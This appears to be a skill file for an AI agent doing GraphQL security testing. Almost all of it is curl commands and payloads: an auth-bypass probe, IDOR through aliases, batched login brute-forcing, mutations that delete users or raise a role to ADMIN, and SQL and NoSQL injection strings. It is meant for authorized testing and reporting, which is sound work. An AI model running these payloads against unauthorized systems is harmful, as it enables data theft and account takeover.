---
name: proto-graphql
description: "GraphQL security testing skill. Tests introspection, authorization bypasses, IDOR via aliases, batching abuse, path-level auth bypass, and federation exploitation. Triggers: 'graphql', 'graphql security', 'graphql introspection', 'graphql idor', 'graphql auth bypass', 'graphql injection', 'graphql testing', '__schema', 'query mutation'."
---

# GraphQL Security Testing

Test every resolver independently — child resolvers often skip auth checks assumed validated by parents.

## Phase 1: Endpoint Discovery

```bash
TARGET="https://<target>"

for path in /graphql /api/graphql /v1/graphql /gql /query /graphiql /graphql/v1 /api/v1/graphql; do
  status=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$TARGET$path" \
    -H "Content-Type: application/json" -d '{"query":"{__typename}"}')
  echo "$status $path"
done

grep -r "createClient\|GraphQLWsLink\|subscriptionClient" js_dump/ | grep -oE "(ws|wss)://[^'\"]+"
```

## Phase 2: Path-Level Auth Bypass (Highest ROI)

Highest-impact check: teams protect `/` with Basic Auth but miss `/graphql`:

```bash
curl -s -o /dev/null -w "%{http_code}" "$TARGET/"

curl -s -X POST "$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{__typename}"}' | jq .

for subdomain in dev staging uat ppd qa preprod; do
  root_status=$(curl -s -o /dev/null -w "%{http_code}" "https://$subdomain.<target.com>/")
  gql_status=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST "https://$subdomain.<target.com>/graphql" \
    -H "Content-Type: application/json" -d '{"query":"{__typename}"}')
  echo "$subdomain: root=$root_status graphql=$gql_status"
done
```

## Phase 3: Schema Introspection

```bash
curl -s -X POST "$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{__schema{types{name fields{name args{name type{name kind ofType{name kind}}}}}}}"
  }' | jq '.data.__schema.types[] | select(.name | startswith("_") | not) | .name'

curl -s -X POST "$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{mutationType{fields{name args{name type{name kind}}}}}}"}' | jq .

curl -s -X POST "$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{queryType{fields{name args{name type{name kind}}}}}}"}' | jq .
```

**When introspection disabled:**
```bash
curl -X POST "$TARGET/graphql" -d '{"query":"{user{__typename}}"}'

curl -X POST "$TARGET/graphql" -d '{"query":"{usr{id}}"}'  # typo → suggests "user"

python3 clairvoyance.py -u "$TARGET/graphql" -w wordlist.txt -o schema.json
```

## Phase 4: Authorization Testing

**IDOR via aliases (one request, multiple objects):**
```graphql
query {
  own_order: order(id: "MY_ORDER_ID") { id total owner { email } }
  foreign_order: order(id: "VICTIM_ORDER_ID") { id total owner { email } }
}
```

```bash
curl -X POST "$TARGET/graphql" \
  -H "Authorization: Bearer <attacker_token>" \
  -d '{
    "query": "query { own: order(id:\"<own_id>\") { id owner { email } } foreign: order(id:\"<victim_id>\") { id owner { email } } }"
  }' | jq .
```

**Child resolver auth bypass:**
```bash
curl -X POST "$TARGET/graphql" \
  -H "Authorization: Bearer <low_priv_token>" \
  -d '{"query":"{ me { organization { allUsers { id email role } } } }"}' | jq .

```

**Relay Node bypass (decode base64 IDs):**
```bash
echo "VXNlcjoxMjM0" | base64 -d  # → User:1234
echo "T3JkZXI6OTk5" | base64 -d  # → Order:999

```

## Phase 5: Batching Abuse

```bash
curl -X POST "$TARGET/graphql" \
  -d '[
    {"query":"{ user(id:\"1\") { email } }"},
    {"query":"{ user(id:\"2\") { email } }"},
    {"query":"{ user(id:\"3\") { email } }"}
  ]'

curl -X POST "$TARGET/graphql" \
  -d '{"query":"{ u1: user(id:\"1\") { email } u2: user(id:\"2\") { email } u3: user(id:\"3\") { email } }"}'

curl -X POST "$TARGET/graphql" \
  -d '{"query":"{ a1: login(email:\"admin@t.com\",pass:\"pass1\"){token} a2: login(email:\"admin@t.com\",pass:\"pass2\"){token} }"}'
```

## Phase 6: Mutations & State Changes

```bash
curl -X POST "$TARGET/graphql" \
  -H "Authorization: Bearer <user_token>" \
  -d '{"query":"mutation { deleteUser(id: \"<victim_id>\") { success } }"}' | jq .

curl -X POST "$TARGET/graphql" \
  -H "Authorization: Bearer <user_token>" \
  -d '{"query":"mutation { updateUserRole(id: \"<own_id>\", role: ADMIN) { role } }"}' | jq .
```

## Phase 7: Injection Testing

```bash
curl -X POST "$TARGET/graphql" \
  -d '{"query":"{ user(id: \"1\\\" OR \\\"1\\\"=\\\"1\") { email } }"}' | jq .

curl -X POST "$TARGET/graphql" \
  -d '{"query":"{ user(id: {\"$ne\": null}) { email role } }"}' | jq .
```

## Validation (REQUIRED before reporting)

Confidence threshold ≥0.70 required. Three criteria:
1. **Causality**: specific query/operation → unauthorized data exposure or state change
2. **Reproducibility**: exact GraphQL operation body that reproduces the finding
3. **Impact**: data exposed (user PII, credentials, admin data) or unauthorized action executed

Document: endpoint URL, HTTP method, full request body, response showing unauthorized data.
